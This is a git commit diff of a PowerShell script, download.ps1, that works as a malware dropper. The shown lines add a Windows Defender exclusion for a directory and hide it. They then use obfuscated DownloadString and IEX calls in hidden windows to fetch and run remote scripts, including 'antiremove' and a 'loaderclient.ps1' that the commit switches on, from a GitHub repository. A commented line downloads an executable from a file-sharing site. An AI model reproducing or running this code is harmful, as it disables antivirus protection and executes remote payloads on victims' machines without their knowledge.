69eea42add7d74502c2ed08d506d720b3cf0cf3b
43a1723 <hai1723notgay@gmail.com>
2025-03-23 14:52:28 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -93,23 +93,23 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Mewing")
+# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/antiremove")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-#$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/ok.ps1")
-#$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-#Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-
-
-
-# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/ok.ps1")
 # $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 # Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
+
+
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 # $url = "https://anonsharing.com/file/efaac0ebb2c760d9/H-Output.exe"
 # $output = "$dir\T_T.exe"
